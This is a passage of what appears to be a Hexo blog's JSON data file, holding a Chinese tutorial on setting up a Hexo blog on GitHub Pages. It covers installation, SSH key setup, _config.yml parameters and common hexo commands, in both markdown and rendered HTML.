| landscape |\n\n#### Deployment\n\n[Docs](https://hexo.io/docs/deployment.html)\n\n├──deploy //配置\n│ ├──type: git //类型\n│ ├──repo: git@github.com:githubname/githubname.github.io.git //新建仓库地址,注意 githubname 是你的 github 名称\n│ ├──branch: master //分支\n\n## 常用命令\n\n- **init** 新建一个网站\n\n```\n$ hexo init <folder>\n```\n\n如果没有设置文件夹，hexo 默认在当前文件夹新建\n\n- **new** 新建一篇文章\n\n```\n$ hexo new [layout] <title>\n```\n\n如果没有设置 layout 的话，默认使用 \\_config.yml 中的 default_layout 参数代替。默认是 post，如果标题包含空格的话，请使用引号括起来。\n\n- 布局（Layout）\n  hexo 三种默认布局：post、page、draft\n\n  | 布局  | 路径            |\n  | ----- | :-------------- |\n  | post  | source/\\_posts  |\n  | page  | source          |\n  | draft | source/\\_drafts |\n\n- 文件名称（title）\n  Hexo 默认以标题做为文件名称，但您可编辑 new_post_name 参数来改变默认的文件名称，举例来说，设为 :year-:month-:day-:title.md 可让您更方便的通过日期来管理文章。\n\n  | 变量     | 描述                               |\n  | -------- | :--------------------------------- |\n  | :title   | 标题（小写，空格将会被替换为短杠） |\n  | :year    | 建立的年份，比如， 2015            |\n  | :month   | 建立的月份（有前导零），比如， 04  |\n  | :i_month | 建立的月份（无前导零），比如， 4   |\n  | :day     | 建立的日期（有前导零），比如， 07  |\n  | :i_day   | 建立的日期（无前导零），比如， 7   |\n\n* **generate** 生成静态文件\n\n```\n$ hexo generate\n```\n\n也可以简写为：\n\n```\n$ hexo g\n```\n\n| 参数        | 描述                   |\n| ----------- | :--------------------- |\n| -d,--deploy | 文件生成后立即部署网站 |\n| -w，--watch | 监视文件变动           |\n\n```\n$ hexo g -d\n```\n\n```\n$ hexo g -w\n```\n\n- **publish** 发布草稿\n\n通过 publish 命令将草稿移动到 source/\\_posts 文件夹，该命令的使用方式与 new 十分类似，您也可在命令中指定 layout 来指定布局\n\n```\n$ hexo publish [layout] <filename>\n\n```\n\n- **server** 启动服务器\n\n```\n$ hexo server\n\n```\n\n| 参数        | 描述                           |\n| ----------- | :----------------------------- |\n| -p，--port  | 重设端口                       |\n| -s,--static | 只使用静态文件                 |\n| -l,--log    | 启动日志记录，使用覆盖记录格式 |\n\n- **deploy** 部署网站\n\n```\n$ hexo deploy\n```\n\n也可以简写为：\n\n```\n$ hexo d\n```\n\n| 参数           | 描述                     |\n| -------------- | :----------------------- |\n| -g, --generate | 部署之前预先生成静态文件 |\n\n```\n$ hexo d -g\n```\n\n注意两者区别：\n\n```\n$ hexo g -d // 文件生成后立即部署网站(新生成的文件)\n$ hexo d -g // 部署之前预先生成静态文件(之前已经生成的文件)\n```\n\n- **render** 渲染文件\n\n```\n$ hexo render <file1> [file2] ...\n```\n\n| 参数         | 描述         |\n| ------------ | :----------- |\n| -o, --output | 设置输出路径 |\n\n- migrate 从其他博客系统\n\n```\n$ hexo migrate <type>\n\n```\n\n- **clean** 清除缓存文件\n\n```\n$ hexo clean\n\n```\n\n- **list** 列出网站资料。\n\n```\n$ hexo list <type>\n\n```\n\n- **version** 显示 Hexo 版本。\n\n```\n$ hexo version\n\n```\n\n- **安全模式**\n\n```\n$ hexo --safe\n```\n\n在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。\n\n- **调试模式**\n\n```\n$ hexo --debug\n```\n\n在终端中显示调试信息并记录到 debug.log。当您碰到问题时，可以尝试用调试模式重新执行一次，并 提交调试信息到 GitHub。\n\n- **简洁模式**\n\n```\n$ hexo --silent\n```\n\n隐藏终端信息。\n\n- **自定义配置文件的路径**\n\n```\n$ hexo --config custom.yml\n```\n\n自定义配置文件的路径，执行后将不再使用 \\_config.yml。\n\n- **显示草稿**\n\n```\n$ hexo --draft\n```\n\n显示 source/\\_drafts 文件夹中的草稿文章。\n\n- **自定义 CWD**\n\n```\n$ hexo --cwd /path/to/cwd\n```\n\n自定义当前工作目录（Current working directory）的路径。\n\n### Scaffold（模板）\n\n在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，\n\n```\n$ hexo new photo \"My Gallery\"\n\n```\n\n在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章，\n\n新建文章模板\n\n```\n$ hexo new post \"My Gallery\"\n\n```\n\n新建分页模板\n\n```\n$ hexo new page \"My Gallery\"\n\n```\n\n新建草稿模板\n\n```\n$ hexo new draft \"My Gallery\"\n\n```\n\n以下是你可以在模版中使用的变量：\n\n| 变量   | 描述         |\n| ------ | :----------- |\n| layout | 布局         |\n| title  | 标题         |\n| date   | 文件建立日期 |\n\n## 创建项目\n","source":"_posts/如何利用Hexo-Github搭建博客.md","raw":"---\ntitle: 如何利用Hexo+Github搭建博客\ndate: 2019-04-01 17:12:54\ntags:\n  - 教程\n  - hexo\n  - github\n---\n\n## 安装依赖环境\n\n[Git:https://git-scm.com/downloads](https://git-scm.com/downloads)\n[Node:https://nodejs.org/en/download/](https://nodejs.org/en/download/)\n\n### 如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。\n\n- 安装 Hexo\n\n```\n$ npm install -g hexo-cli\n\n```\n\n### 安装\n\n- 安装 Git\n  下载并安装 [Git](https://git-scm.com/downloads).\n- 安装 Node\n  下载并安装 [Node](https://nodejs.org/en/download/)\n  - 检查是否安装成功\n\n```\n$ node -v\n```\n\n![node_v](如何利用Hexo-Github搭建博客/node_v.png)\n\n- 安装 Hexo\n\n```\n$ npm install -g hexo-cli\n\n```\n\n- 检查是否安装成功\n\n```\n$ hexo -v\n```\n\n![hexo_v](如何利用Hexo-Github搭建博客/-v.png)\n\n## 创建 Hexo\n\n- 新建文件夹并初始化\n\n```\n$ hexo init <folder>\n```\n\n- 进入文件夹\n\n```\n$ cd <folder>\n```\n\n- 安装依赖\n\n```\n$ npm install\n\n```\n\n### 安装完成，项目结构目录如下\n\n├── \\_config.yml // 网站的配置信息\n├── package.json // 应用程序信息\n├── scaffolds // 模板文件夹\n├── source // 存放用户资源\n│ ├── \\_drafts\n│ ├── \\_post\n└── themes // 主题\n\n- 创建\n\n```\n$ hexo g\n\n```\n\n- 在服务端打开\n\n```\n$ hexo server\n\n```\n\n![server](如何利用Hexo-Github搭建博客/server.png)\n你就可以查看你的 hexo 了，默认端口 4000，[http://localhost:4000](http://localhost:4000)\n\n## 新建 git 仓库项目\n\nGithub 账户注册和新建项目\n\n- 新建\n  ![new](如何利用Hexo-Github搭建博客/new.png)\n- 项目名称格式： **githubname**.github.io,如：zhangsan.github.io\n  *注意：*一定要是你注册 github 的用户名+github.io\n  ![create_new_repo](如何利用Hexo-Github搭建博客/create_new_repo.png)\n- Github Pages\n  选择 settings，下拉至 Github Pages，你就发现你刚才新建的项目已经部署到网上了，可以直接访问\n  ![github_pages](如何利用Hexo-Github搭建博客/github_pages.png)\n\n## 将 git 仓库与 hexo 关联起来\n\n在所在文件夹 打开 Git Bash\n\n- 设置你的 github 用户名和邮箱\n\n```\n$ git config --global user.name \"github_name\"\n$ git config --global user.emil \"github_emil\"\n\n//你的github注册名和注册邮箱\n\n```\n\n![emil](如何利用Hexo-Github搭建博客/emil.png)\n\n- 检查是否存在 ssh key\n\n```\n$ cd ~/.ssh\n```\n\n- 如果已经存在，可可以看见该.ssh 文件夹\n  ![ssh_folder](如何利用Hexo-Github搭建博客/ssh_folder.png)\n- 如果没有则需要去生成\n\n```\n$ ssh-keygen -t rsa -C \"github_emil\"\n// 三次回车，就会生成key\n```\n\n![key](如何利用Hexo-Github搭建博客/key.png)\n\n- 进入.ssh 文件夹,可以看见三个文件，id_rsa 是你的私钥，id_rsa.pub 是公钥，需要放在 github 上，这样你每次提交代码到仓库，都会进行本地的私钥和 git 混的公钥进行匹配，匹配完成，你才能进行一系列的操作\n  ![ssh_folder](如何利用Hexo-Github搭建博客/ssh_folder.png)\n- 打开 id_rsa.pub，复制里面的内容到 github 上的 SSH key 中（最后一行包含的是你的注册邮箱的信息）\n  ![ssh_text](如何利用Hexo-Github搭建博客/ssh_text.png)\n- 登录 Github，点击头像下的 **settings**\n  ![set_ssh](如何利用Hexo-Github搭建博客/set_ssh.png)\n- 选择 **SSH and GPG keys**\n- 找到右侧 **New SSH key**\n  ![ssh_key](如何利用Hexo-Github搭建博客/ssh_key.png)\n- title 随便填写，将复制的 id_rsa.pub 内容放至 key 中，点击**Add SSH key**保存，即可\n- 输入 ssh -T git@github.com，测试添加 ssh 是否成功\n\n```\n$ ssh -T git@github.com\n```\n\n如果看见**Hi,xxxxx...**,说明你就成功了\n![test_ssh](如何利用Hexo-Github搭建博客/test_ssh.png)\n\n## 新建文章\n\n```\n$ hexo new post \"如何利用Hexo-Github搭建博客\"\n```\n\n## 配置 deploy\n\n- 打开根目录下的\\_config.yml 文件\n- deploy:\n  - type: git\n  - repo: git@github.com:**githubname**/**githubname**.github.io.git\n  - branch: master\n\n## 安装插件\n\n```\n$ npm install hexo-deployer-git --save\n```\n\n## 生成文章\n\n```\n$ hexo g\n```\n\n## 完成部署\n\n```\n$ hexo d\n```\n\n## 打开 **https://githubname.github.io/** ,查看你的博客吧！\n\n# 关于 Hexo 的详细配置\n\n## 配置信息 \\_config.yml\n\n#### Site（网站）\n\n| 参数        | 描述                               |\n| ----------- | :--------------------------------- |\n| title       | 网站标题                           |\n| subtitle    | 网站副标题                         |\n| description | 网站描述，description 主要用于 SEO |\n| keywords    | 关键字                             |\n| author      | 你的名字                           |\n| language    | 网站使用的语言                     |\n| timezone    | 网站时区，默认是你电脑的时区       |\n\n#### URL(网址)\n\n| 参数               | 描述                     | 默认值                    |\n| ------------------ | :----------------------- | :------------------------ |\n| url                | 网址                     |\n| root               | 网站根目录               |\n| permalink          | 文章的永久链接格式       | :year/:month/:day/:title/ |\n| permalink_defaults | 永久链接中各部分的默认值 |\n\n##### 网站存放在子目录\n\n如果你的网站存放在子目录中：http://yoursite.com/blog，则：\nurl：http://yoursite.com/blog\nroot：/blog/\n\n#### Directory(目录)\n\n| 参数         | 描述                                         | 默认值         |\n| ------------ | :------------------------------------------- | :------------- |\n| source_dir   | 资源文件夹，这个文件夹用来存放内容           | source         |\n| public_dir   | 公共文件夹，这个文件夹用于存放生成的站点文件 | public         |\n| tag_dir      | 标签文件夹                                   | tags           |\n| archive_dir  | 归档文件夹                                   | archives       |\n| category_dir | 分类文件夹                                   | categories     |\n| code_dir     | Include code 文件夹                          | downloads/code |\n| i18n_dir     | 国际化文件夹                                 | :lang          |\n| skip_render  | 跳过指定文件的渲染                           |\n\ntips：如果您刚刚开始接触 Hexo，通常没有必要修改这一部分的值。\n\n#### Writing（文章）\n\n| 参数              | 描述                               | 默认值    |\n| ----------------- | :--------------------------------- | :-------- |\n| new_post_name     | 新建文章的名称                     | :title.md |\n| default_layout    | 预设布局                           | post      |\n| auto_spacing      | 在中文和英文之间加入空格           | false     |\n| titlecase         | 把标题转为 title case              | false     |\n| external_link     | 在新标签中打开链接                 | true      |\n| filename_case     | 把文件名称转换为小写(1)或者大写(2) | 0         |\n| render_drafts     | 显示草稿                           | false     |\n| post_asset_folder | 启动 Asset 文件夹                  | true      |\n| relative_link     | 把链接改为与根目录的相对位址       | false     |\n| future            | 现实未来的文章                     | true      |\n| highlight         | 代码块的设置                       |\n\n#### Category & Tag（分类&标签）\n\n| 参数             | 描述     | 默认值        |\n| ---------------- | :------- | :------------ |\n| default_category | 默认分类 | uncategorized |\n| category_map     | 分类别名 |\n| tag_map          | 标签别名 |\n\n#### Date / Time format\n\nHexo 使用 Moment.js 来解析和显示时间。\n\n| 参数        | 描述     | 默认值     |\n| ----------- | :------- | :--------- |\n| date_format | 日期格式 | YYYY-MM-DD |\n| time_format | 时间格式 | HH:mm:ss   |\n\n#### Pagination（分页）\n\n| 参数           | 描述                                | 默认值 |\n| -------------- | :---------------------------------- | :----- |\n| per_page       | 每页显示的文章量 (0 = 关闭分页功能) | 10     |\n| pagination_dir | 分页目录                            | page   |\n\n#### Extensions（扩展）\n\n[Plugins](https://hexo.io/plugins/)\n[Themes](https://hexo.io/themes/)\n\n| 参数  | 描述                            | 默认值    |\n| ----- | :------------------------------ | :-------- |\n| theme | 当前主题，值为 false 时禁用主题 | landscape |\n\n#### Deployment\n\n[Docs](https://hexo.io/docs/deployment.html)\n\n├──deploy //配置\n│ ├──type: git //类型\n│ ├──repo: git@github.com:githubname/githubname.github.io.git //新建仓库地址,注意 githubname 是你的 github 名称\n│ ├──branch: master //分支\n\n## 常用命令\n\n- **init** 新建一个网站\n\n```\n$ hexo init <folder>\n```\n\n如果没有设置文件夹，hexo 默认在当前文件夹新建\n\n- **new** 新建一篇文章\n\n```\n$ hexo new [layout] <title>\n```\n\n如果没有设置 layout 的话，默认使用 \\_config.yml 中的 default_layout 参数代替。默认是 post，如果标题包含空格的话，请使用引号括起来。\n\n- 布局（Layout）\n  hexo 三种默认布局：post、page、draft\n\n  | 布局  | 路径            |\n  | ----- | :-------------- |\n  | post  | source/\\_posts  |\n  | page  | source          |\n  | draft | source/\\_drafts |\n\n- 文件名称（title）\n  Hexo 默认以标题做为文件名称，但您可编辑 new_post_name 参数来改变默认的文件名称，举例来说，设为 :year-:month-:day-:title.md 可让您更方便的通过日期来管理文章。\n\n  | 变量     | 描述                               |\n  | -------- | :--------------------------------- |\n  | :title   | 标题（小写，空格将会被替换为短杠） |\n  | :year    | 建立的年份，比如， 2015            |\n  | :month   | 建立的月份（有前导零），比如， 04  |\n  | :i_month | 建立的月份（无前导零），比如， 4   |\n  | :day     | 建立的日期（有前导零），比如， 07  |\n  | :i_day   | 建立的日期（无前导零），比如， 7   |\n\n* **generate** 生成静态文件\n\n```\n$ hexo generate\n```\n\n也可以简写为：\n\n```\n$ hexo g\n```\n\n| 参数        | 描述                   |\n| ----------- | :--------------------- |\n| -d,--deploy | 文件生成后立即部署网站 |\n| -w，--watch | 监视文件变动           |\n\n```\n$ hexo g -d\n```\n\n```\n$ hexo g -w\n```\n\n- **publish** 发布草稿\n\n通过 publish 命令将草稿移动到 source/\\_posts 文件夹，该命令的使用方式与 new 十分类似，您也可在命令中指定 layout 来指定布局\n\n```\n$ hexo publish [layout] <filename>\n\n```\n\n- **server** 启动服务器\n\n```\n$ hexo server\n\n```\n\n| 参数        | 描述                           |\n| ----------- | :----------------------------- |\n| -p，--port  | 重设端口                       |\n| -s,--static | 只使用静态文件                 |\n| -l,--log    | 启动日志记录，使用覆盖记录格式 |\n\n- **deploy** 部署网站\n\n```\n$ hexo deploy\n```\n\n也可以简写为：\n\n```\n$ hexo d\n```\n\n| 参数           | 描述                     |\n| -------------- | :----------------------- |\n| -g, --generate | 部署之前预先生成静态文件 |\n\n```\n$ hexo d -g\n```\n\n注意两者区别：\n\n```\n$ hexo g -d // 文件生成后立即部署网站(新生成的文件)\n$ hexo d -g // 部署之前预先生成静态文件(之前已经生成的文件)\n```\n\n- **render** 渲染文件\n\n```\n$ hexo render <file1> [file2] ...\n```\n\n| 参数         | 描述         |\n| ------------ | :----------- |\n| -o, --output | 设置输出路径 |\n\n- migrate 从其他博客系统\n\n```\n$ hexo migrate <type>\n\n```\n\n- **clean** 清除缓存文件\n\n```\n$ hexo clean\n\n```\n\n- **list** 列出网站资料。\n\n```\n$ hexo list <type>\n\n```\n\n- **version** 显示 Hexo 版本。\n\n```\n$ hexo version\n\n```\n\n- **安全模式**\n\n```\n$ hexo --safe\n```\n\n在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。\n\n- **调试模式**\n\n```\n$ hexo --debug\n```\n\n在终端中显示调试信息并记录到 debug.log。当您碰到问题时，可以尝试用调试模式重新执行一次，并 提交调试信息到 GitHub。\n\n- **简洁模式**\n\n```\n$ hexo --silent\n```\n\n隐藏终端信息。\n\n- **自定义配置文件的路径**\n\n```\n$ hexo --config custom.yml\n```\n\n自定义配置文件的路径，执行后将不再使用 \\_config.yml。\n\n- **显示草稿**\n\n```\n$ hexo --draft\n```\n\n显示 source/\\_drafts 文件夹中的草稿文章。\n\n- **自定义 CWD**\n\n```\n$ hexo --cwd /path/to/cwd\n```\n\n自定义当前工作目录（Current working directory）的路径。\n\n### Scaffold（模板）\n\n在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，\n\n```\n$ hexo new photo \"My Gallery\"\n\n```\n\n在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章，\n\n新建文章模板\n\n```\n$ hexo new post \"My Gallery\"\n\n```\n\n新建分页模板\n\n```\n$ hexo new page \"My Gallery\"\n\n```\n\n新建草稿模板\n\n```\n$ hexo new draft \"My Gallery\"\n\n```\n\n以下是你可以在模版中使用的变量：\n\n| 变量   | 描述         |\n| ------ | :----------- |\n| layout | 布局         |\n| title  | 标题         |\n| date   | 文件建立日期 |\n\n## 创建项目\n","slug":"如何利用Hexo-Github搭建博客","published":1,"updated":"2022-02-23T03:09:02.901Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950d2000jn0w1ezd32nbh","content":"<h2 id=\"安装依赖环境\"><a href=\"#安装依赖环境\" class=\"headerlink\" title=\"安装依赖环境\"></a>安装依赖环境</h2><p><a href=\"https://git-scm.com/downloads\">Git:https://git-scm.com/downloads</a><br><a href=\"https://nodejs.org/en/download/\">Node:https://nodejs.org/en/download/</a></p>\n<h3 id=\"如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用-npm-即可完成-Hexo-的安装。\"><a href=\"#如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用-npm-即可完成-Hexo-的安装。\" class=\"headerlink\" title=\"如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。\"></a>如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。</h3><ul>\n<li>安装 Hexo</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo-cli</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><ul>\n<li>安装 Git<br>下载并安装 <a href=\"https://git-scm.com/downloads\">Git</a>.</li>\n<li>安装 Node<br>下载并安装 <a href=\"https://nodejs.org/en/download/\">Node</a><ul>\n<li>检查是否安装成功</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ node -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/node_v.png\" alt=\"node_v\"></p>\n<ul>\n<li>安装 Hexo</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo-cli</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>检查是否安装成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/-v.png\" alt=\"hexo_v\"></p>\n<h2 id=\"创建-Hexo\"><a href=\"#创建-Hexo\" class=\"headerlink\" title=\"创建 Hexo\"></a>创建 Hexo</h2><ul>\n<li>新建文件夹并初始化</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>进入文件夹</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装完成，项目结构目录如下\"><a href=\"#安装完成，项目结构目录如下\" class=\"headerlink\" title=\"安装完成，项目结构目录如下\"></a>安装完成，项目结构目录如下</h3><p>├── _config.yml // 网站的配置信息<br>├── package.json // 应用程序信息<br>├── scaffolds // 模板文件夹<br>├── source // 存放用户资源<br>│ ├── _drafts<br>│ ├── _post<br>└── themes // 主题</p>\n<ul>\n<li>创建</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在服务端打开</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/server.png\" alt=\"server\"><br>你就可以查看你的 hexo 了，默认端口 4000，<a href=\"http://localhost:4000/\">http://localhost:4000</a></p>\n<h2 id=\"新建-git-仓库项目\"><a href=\"#新建-git-仓库项目\" class=\"headerlink\" title=\"新建 git 仓库项目\"></a>新建 git 仓库项目</h2><p>Github 账户注册和新建项目</p>\n<ul>\n<li>新建<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/new.png\" alt=\"new\"></li>\n<li>项目名称格式： <strong>githubname</strong>.github.io,如：zhangsan.github.io<br><em>注意：</em>一定要是你注册 github 的用户名+github.io<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/create_new_repo.png\" alt=\"create_new_repo\"></li>\n<li>Github Pages<br>选择 settings，下拉至 Github Pages，你就发现你刚才新建的项目已经部署到网上了，可以直接访问<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/github_pages.png\" alt=\"github_pages\"></li>\n</ul>\n<h2 id=\"将-git-仓库与-hexo-关联起来\"><a href=\"#将-git-仓库与-hexo-关联起来\" class=\"headerlink\" title=\"将 git 仓库与 hexo 关联起来\"></a>将 git 仓库与 hexo 关联起来</h2><p>在所在文件夹 打开 Git Bash</p>\n<ul>\n<li>设置你的 github 用户名和邮箱</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name &quot;github_name&quot;</span><br><span class=\"line\">$ git config --global user.emil &quot;github_emil&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//你的github注册名和注册邮箱</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/emil.png\" alt=\"emil\"></p>\n<ul>\n<li>检查是否存在 ssh key</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd ~/.ssh</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>如果已经存在，可可以看见该.ssh 文件夹<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_folder.png\" alt=\"ssh_folder\"></li>\n<li>如果没有则需要去生成</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen -t rsa -C &quot;github_emil&quot;</span><br><span class=\"line\">// 三次回车，就会生成key</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/key.png\" alt=\"key\"></p>\n<ul>\n<li>进入.ssh 文件夹,可以看见三个文件，id_rsa 是你的私钥，id_rsa.pub 是公钥，需要放在 github 上，这样你每次提交代码到仓库，都会进行本地的私钥和 git 混的公钥进行匹配，匹配完成，你才能进行一系列的操作<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_folder.png\" alt=\"ssh_folder\"></li>\n<li>打开 id_rsa.pub，复制里面的内容到 github 上的 SSH key 中（最后一行包含的是你的注册邮箱的信息）<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_text.png\" alt=\"ssh_text\"></li>\n<li>登录 Github，点击头像下的 <strong>settings</strong><br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/set_ssh.png\" alt=\"set_ssh\"></li>\n<li>选择 <strong>SSH and GPG keys</strong></li>\n<li>找到右侧 <strong>New SSH key</strong><br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_key.png\" alt=\"ssh_key\"></li>\n<li>title 随便填写，将复制的 id_rsa.pub 内容放至 key 中，点击<strong>Add SSH key</strong>保存，即可</li>\n<li>输入 ssh -T <a href=\"mailto:&#103;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;\">&#103;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;</a>，测试添加 ssh 是否成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<p>如果看见<strong>Hi,xxxxx…</strong>,说明你就成功了<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/test_ssh.png\" alt=\"test_ssh\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new post &quot;如何利用Hexo-Github搭建博客&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置-deploy\"><a href=\"#配置-deploy\" class=\"headerlink\" title=\"配置 deploy\"></a>配置 deploy</h2><ul>\n<li>打开根目录下的_config.yml 文件</li>\n<li>deploy:<ul>\n<li>type: git</li>\n<li>repo: <a href=\"mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;\">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;</a>:<strong>githubname</strong>/<strong>githubname</strong>.github.io.git</li>\n<li>branch: master</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"生成文章\"><a href=\"#生成文章\" class=\"headerlink\" title=\"生成文章\"></a>生成文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"完成部署\"><a href=\"#完成部署\" class=\"headerlink\" title=\"完成部署\"></a>完成部署</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo 